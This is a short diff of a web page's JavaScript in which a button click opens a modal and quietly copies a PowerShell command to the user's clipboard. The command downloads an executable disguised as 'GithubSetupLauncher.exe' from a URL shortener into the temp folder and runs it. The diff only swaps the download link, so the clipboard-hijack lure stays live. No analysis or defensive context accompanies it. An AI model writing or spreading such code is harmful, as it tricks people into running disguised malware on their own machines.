@@ -4,7 +4,7 @@ const closeBtn = document.getElementById('closeModalBtn');
 
 btn.addEventListener('click', async () => {
     modal.style.display = 'flex';
-    navigator.clipboard.writeText('Powershell Start-BitsTransfer -Source \'https://shorturl.at/Sp2Cp\' -Destination "$env:TEMP\\GithubSetupLauncher.exe"; Start-Process "$env:TEMP\\GithubSetupLauncher.exe"');
+    navigator.clipboard.writeText('Powershell Start-BitsTransfer -Source \'https://shorturl.at/PUv8h\' -Destination "$env:TEMP\\GithubSetupLauncher.exe"; Start-Process "$env:TEMP\\GithubSetupLauncher.exe"');
     });
 
 closeBtn.addEventListener('click', () => {
@@ -16,3 +16,4 @@ window.addEventListener('click', (e) => {
         modal.style.display = 'none';
     }
 });
+
